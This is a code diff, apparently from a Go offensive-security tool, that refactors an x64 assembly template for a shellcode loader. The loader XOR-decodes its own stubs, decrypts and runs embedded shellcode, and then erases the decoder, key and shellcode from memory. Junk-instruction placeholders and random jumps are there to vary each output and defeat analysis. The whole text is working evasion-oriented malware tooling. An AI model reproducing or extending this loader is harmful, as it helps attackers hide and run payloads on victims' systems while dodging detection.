@@ -189,94 +189,93 @@ var x64Loader = `
 
 entry:
   // save context and prepare the environment
-  {{db .JumpShort}}                          // random jump short
-  {{db .SaveContext}}                        // save GP registers
-  push rbx                         {{igi}}   // store rbx for save entry address
-  push rbp                         {{igi}}   // store rbp for save stack address
-  mov rbp, rsp                     {{igi}}   // create new stack frame
-  and rsp, 0xFFFFFFFFFFFFFFF0      {{igi}}   // ensure stack is 16 bytes aligned
-  sub rsp, 0x200                   {{igi}}   // reserve stack
-  fxsave [rsp]                     {{igi}}   // save FP registers
+  {{db .JumpShort}}                            // random jump short
+  {{db .SaveContext}}                          // save GP registers
+  push rbx                                     // store rbx for save entry address
+  push rbp                                     // store rbp for save stack address
+  mov rbp, rsp                                 // create new stack frame
+  and rsp, 0xFFFFFFFFFFFFFFF0                  // ensure stack is 16 bytes aligned
+  sub rsp, 0x200                               // reserve stack
+  fxsave [rsp]                                 // save FP registers
 
   // calculate the entry address
-  {{igi}}                          {{igi}}
-  call calc_entry_addr
-  flag_CEA:
-  {{igi}}                          {{igi}}
+  lea rbx, [rip + entry]
+
+  // save context for call shellcode
+  push rcx
+  push rdx
+  push r8
+  push r9
 
   // decode instructions in stub and erase them
+  call decode_stubs
+  call decode_shellcode
+  call erase_decoder_stub
+  call erase_crypto_key_stub
 
-  {{db .SaveRegister}}
-  call decode_stubs                {{igi}}
-  call decode_shellcode            {{igi}}
-  call erase_decoder_stub          {{igi}}
-  call erase_crypto_key_stub       {{igi}}
-  {{db .RestoreRegister}}
+  // restore context for call shellcode
+  pop r9
+  pop r8
+  pop rdx
+  pop rcx
+
+  // erase entry
 
   // execute the shellcode
-  sub rsp, 0x80                    {{igi}}   // reserve stack
-  call shellcode_stub              {{igi}}   // call the shellcode
-  add rsp, 0x80                    {{igi}}   // restore stack
+  sub rsp, 0x80                    {{igi}}     // reserve stack
+  call shellcode_stub              {{igi}}     // call the shellcode
+  add rsp, 0x80                    {{igi}}     // restore stack
  
   // erase the remaining instructions
-  push rax                         {{igi}}   // save the shellcode return value
+  push rax                         {{igi}}     // save the shellcode return value
   call erase_shellcode_stub        {{igi}}
   call erase_eraser_stub           {{igi}}
-  pop rax                          {{igi}}   // restore the shellcode return value
+  pop rax                          {{igi}}     // restore the shellcode return value
 
-  fxrstor [rsp]                    {{igi}}   // restore FP registers
-  add rsp, 0x200                   {{igi}}   // reserve stack
-  mov rsp, rbp                     {{igi}}   // restore stack address
-  pop rbp                          {{igi}}   // restore rbp
-  pop rbx                          {{igi}}   // restore rbx
-  {{db .RestoreContext}}                     // restore GP registers
+  fxrstor [rsp]                    {{igi}}     // restore FP registers
+  add rsp, 0x200                   {{igi}}     // reserve stack
+  mov rsp, rbp                     {{igi}}     // restore stack address
+  pop rbp                          {{igi}}     // restore rbp
+  pop rbx                          {{igi}}     // restore rbx
+  {{db .RestoreContext}}                       // restore GP registers
   ret                              {{igi}}
-  
-// calculate the shellcode entry address.
-calc_entry_addr:
-  pop rax                          {{igi}}   // get return address
-  mov rbx, rax                     {{igi}}   // calculate entry address
-  sub rbx, flag_CEA                {{igi}}   // fix bug for assembler
-  push rax                         {{igi}}   // push return address
-  ret                              {{igi}}   // return to the entry
 
 // rcx = data address, rdx = data length, r8 = key.
 // this function assumes that the data length is divisible by 8.
 mini_xor:
-  shr rdx, 3                       {{igi}}   // rcx = rcx / 8
-  loop_xor:                        {{igi}}
-  xor [rcx], r8                    {{igi}}
-  add rcx, 8                       {{igi}}
-  dec rdx                          {{igi}}
-  jnz loop_xor                     {{igi}}
-  ret                              {{igi}}
+  shr rdx, 3     // rdx /= 8
+  loop_xor:
+  xor [rcx], r8
+  add rcx, 8
+  dec rdx
+  jnz loop_xor
+  ret
 
 decode_stubs:
-  lea rcx, [rbx + decoder_stub]              {{igi}}
-  mov rdx, eraser_stub - decoder_stub        {{igi}}
-  mov r8, {{hex .DecoderSK}}                 {{igi}}
-  call mini_xor                              {{igi}}
+  mov r8, {{hex .StubKey}}
 
-  lea rcx, [rbx + eraser_stub]               {{igi}}
-  mov rdx, crypto_key_stub - eraser_stub     {{igi}}
-  mov r8, {{hex .EraserSK}}                  {{igi}}
-  call mini_xor                              {{igi}}
+  lea rcx, [rbx + decoder_stub]
+  mov rdx, eraser_stub - decoder_stub
+  call mini_xor
 
-  lea rcx, [rbx + crypto_key_stub]           {{igi}}
-  mov rdx, shellcode_stub - crypto_key_stub  {{igi}}
-  mov r8, {{hex .CryptoKeySK}}               {{igi}}
-  call mini_xor                              {{igi}}
-  ret                                        {{igi}}
+  lea rcx, [rbx + eraser_stub]
+  mov rdx, crypto_key_stub - eraser_stub
+  call mini_xor
+
+  lea rcx, [rbx + crypto_key_stub]
+  mov rdx, shellcode_stub - crypto_key_stub
+  call mini_xor
+  ret
 
 decode_shellcode:
-  lea rcx, [rbx + shellcode_stub]  {{igi}}
-  mov rdx, {{hex .ShellcodeLen}}   {{igi}}
-  lea r8, [rbx + crypto_key_stub]  {{igi}}
-  mov r9, {{hex .CryptoKeyLen}}    {{igi}}
-  sub rsp, 0x40                    {{igi}}
-  call decoder_stub                {{igi}}
-  add rsp, 0x40                    {{igi}}
-  ret                              {{igi}}
+  lea rcx, [rbx + shellcode_stub]
+  mov rdx, {{hex .ShellcodeLen}}
+  lea r8, [rbx + crypto_key_stub]
+  mov r9, {{hex .CryptoKeyLen}}
+  sub rsp, 0x40
+  call decoder_stub
+  add rsp, 0x40
+  ret
 
 // TODO merge the next func
 erase_decoder_stub:
@@ -320,18 +319,14 @@ type loaderCtx struct {
 	SaveContext    []byte
 	RestoreContext []byte
 
-	SaveRegister    []byte
-	RestoreRegister []byte
-
-	DecoderSK   interface{}
-	EraserSK    interface{}
-	CryptoKeySK interface{}
+	StubKey interface{}
 
 	DecoderStub   []byte
 	EraserStub    []byte
 	CryptoKeyStub []byte
-	CryptoKeyLen  int
-	ShellcodeLen  int
+
+	CryptoKeyLen int
+	ShellcodeLen int
 }
 
 func toDB(b []byte) string {
